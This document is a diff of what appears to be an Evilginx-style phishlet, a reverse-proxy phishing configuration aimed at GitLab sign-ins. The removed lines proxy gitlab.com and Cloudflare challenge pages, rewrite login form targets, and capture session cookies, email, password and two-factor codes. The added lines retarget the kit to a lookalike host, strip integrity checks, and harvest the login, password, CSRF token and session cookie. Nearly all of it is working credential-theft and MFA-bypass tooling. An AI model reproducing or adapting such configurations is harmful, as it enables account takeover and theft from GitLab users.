@@ -1,74 +1,38 @@
-author: '@APP-CHOMPOO'                                                                                  
-min_ver: '2.3.0'
+author: '@PMU'
+min_ver: '3.0.0'
 
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'gitlab.com', session: true, is_landing: true}
-  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'gitlab.com', session: false, is_landing: false}
-  - {phish_sub: 'sentry', orig_sub: 'sentry', domain: 'gitlab.com', session: false, is_landing: false}
-  - {phish_sub: 'snowplow', orig_sub: 'snowplow', domain: 'gitlab.com', session: false, is_landing: false}
-  - {phish_sub: 'collector', orig_sub: 'collector', domain: 'prd-278964.gl-product-anlytics.com', session: false, is_landing: false}
-  - {phish_sub: 'ci', orig_sub: 'ci', domain: 'gitlab.com', session: false, is_landing: false}
-  - {phish_sub: 'uploads', orig_sub: 'uploads', domain: 'gitlab.com', session: false, is_landing: false}
-  - {phish_sub: 'registry', orig_sub: 'registry', domain: 'gitlab.com', session: false, is_landing: false}
-  - {phish_sub: 'pages', orig_sub: 'pages', domain: 'gitlab.io', session: false, is_landing: false}
-  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'challenges.cloudflare.com', session: true, is_landing: false}
-#  - {phish_sub: '', orig_sub: '', domain: 'challenges.services-data.com', session: true, is_landing: false}
-#  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: true, is_landing: false}
-  - {phish_sub: 'customers', orig_sub: 'customers', domain: 'gitlab.com', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'services-data.com:4443', session: true, is_landing: true}
 
 sub_filters:
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'action="https://gitlab.com/users/sign_in"', replace: 'action="https://{hostname}/users/sign_in"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'action="https://gitlab.com/users/auth/google_oauth2"', replace: 'action="https://{hostname}/users/auth/google_oauth2"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'action="https://gitlab.com/users/auth/github"', replace: 'action="https://{hostname}/users/auth/github"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'action="https://gitlab.com/users/auth/bitbucket"', replace: 'action="https://{hostname}/users/auth/bitbucket"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'action="https://gitlab.com/users/auth/salesforce"', replace: 'action="https://{hostname}/users/auth/salesforce"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://gitlab.com/users/password/new"', replace: 'href="https://{hostname}/users/password/new"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://gitlab.com/-/users/terms"', replace: 'href="https://{hostname}/-/users/terms"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://gitlab.com/users/sign_up"', replace: 'href="https://{hostname}/users/sign_up"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://gitlab.com/explore"', replace: 'href="https://{hostname}/explore"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://gitlab.com/help"', replace: 'href="https://{hostname}/help"', mimes: ['text/html']}
-  - {triggers_on: 'gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'window.location.href', replace: 'window.loccation.href="https://{hostname}/users/sign_in"', mimes: ['text/html']}
-  - {triggers_on: 'challenges.cloudflare.com', orig_sub: 'challenges', domain: 'cloudflare.com', search: 'href="https://www.cloudflare.com/?utm_source=challenge&utm_campaign=m"', replace: 'href="https://{hostname}/cdn-cgi/challenge-platform"', mimes: ['text/html']}
-  - {triggers_on: 'challenges.cloudflare.com', orig_sub: '', domain: 'challenges.cloudflare.com', search: 'window.location', replace: 'window.location="https://{hostname}/users/sign_in"', mimes: ['text/html']}
-  - {triggers_on: 'challenges.cloudflare.com', orig_sub: '', domain: 'challenges.cloudflare.com', search: 'window.location.href', replace: 'window.location.href="https://{hostname}/users/sign_in"', mimes: ['text/html']}
-  - {triggers_on: 'cloudflare.com', orig_sub: '', domain: 'cloudflare.com', search: 'window.location"', replace: 'window.location="https://{hostname}/cdn-cgi/challenge-platform"', mimes: ['text/html', 'application/javascript']}
-  - {triggers_on: 'cloudflare.com', orig_sub: '', domain: 'cloudflare.com', search: 'window.location="https://www.cloudflare.com/?utm_source=challenge&utm_campaign=m"', replace: 'window.location="https://{hostname}/cdn-cgi/challenge-platform"', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: '', domain: 'services-data.com:4443', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: 'users', domain: 'services-data.com:4443', search: 'action="https://{hostname}/users/sign_in"', replace: 'action="https://{hostname}/users/sign_in"', mimes: ['text/html']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: 'users', domain: 'services-data.com:4443', search: 'href="https://{hostname}/users/sign_up"', replace: 'href="https://{hostname}/users/sign_up"', mimes: ['text/html']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: 'users/password', domain: 'services-data.com:4443', search: 'href="https://{hostname}/users/password/new"', replace: 'href="https://{hostname}/users/password/new"', mimes: ['text/html']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: 'explore', domain: 'services-data.com:4443', search: 'href="https://{hostname}/explore"', replace: 'href="https://{hostname}/explore"', mimes: ['text/html']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: 'help', domain: 'services-data.com:4443', search: 'href="https://{hostname}/help"', replace: 'href="https://{hostname}/help"', mimes: ['text/html']}
+  - {triggers_on: 'services-data.com:4443', orig_sub: 'help/development/i18n', domain: 'services-data.com:4443', search: 'href="https://{hostname}/help/development/i18n/translation.md"', replace: 'href="https://{hostname}/help/development/i18n/translation.md"', mimes: ['text/html']}
+  - {triggers_on: 'about.gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://about.gitlab.com/"', replace: 'href="https://about.gitlab.com/"', mimes: ['text/html']}
+  - {triggers_on: 'forum.gitlab.com', orig_sub: '', domain: 'gitlab.com', search: 'href="https://forum.gitlab.com/"', replace: 'href="https://forum.gitlab.com/"', mimes: ['text/html']}
 
 auth_tokens:
-  - domain: '.gitlab.com'
-    keys: ['mutiny.user.session', 'mutiny.user.session_number', 'mutiny.user.token', '_biz_flagsA', '_biz_uid', '_biz_nA', '_biz_pendungA', '_ga', '_cfuvid', '_uetsid', '_uetvid', 'cf_claerance', 'OptanonConsent',
-           '_gcl_au', '_sp_id.6d85', '_sp_ses.6b85', '_gcl_au', '_ga_EVTFNG2S5Z', '_ga_ENFH3X7M5Y',
-           'authenticity_token', '.*,regexp']
-  - domain: 'gitlab.com'
-    keys: ['cf_chl_rc_m', '_sp_ses.e54d', '_sp_id.e54d', '_gitlab_session', 'preferred_language', '.*,regexp']
-    auth_urls: ['https://gitlab.com/users/sign_in']
-    cookies: true
-  - domain: 'cloudflare.com'
-    keys: ['cf_clearance', '_cfuvid', '.*']
-
-auth_urls:
-  - '/cdn-cgi/challenge-platform'
-  - '/users/sign_in'
-  - 'users/password/new'
-  - '/oauth/authorize'
-  - '/users/auth/github'
-  - '/users/auth/google_oauth2'
-  - '/oauth/token'
+  - domain: '.services-data.com:4443'
+    keys: ['_gitlab_session']
 
 credentials:
+  authenticity_token:
+    key: 'authenticity_token'
+    search: '(.*)'
+    type: 'post'
   username:
-    key: 'user[email]'
+    key: 'user[login]'
     search: '(.*)'
     type: 'post'
   password:
     key: 'user[password]'
     search: '(.*)'
     type: 'post'
-  two_factor_code:
-    key: 'user[otp_attempt]'
-    search: '(.*)'
-    type: 'post'
-    
+
 login:
-  domain: 'gitlab.com'
+  domain: 'services-data.com:4443'
   path: '/users/sign_in'
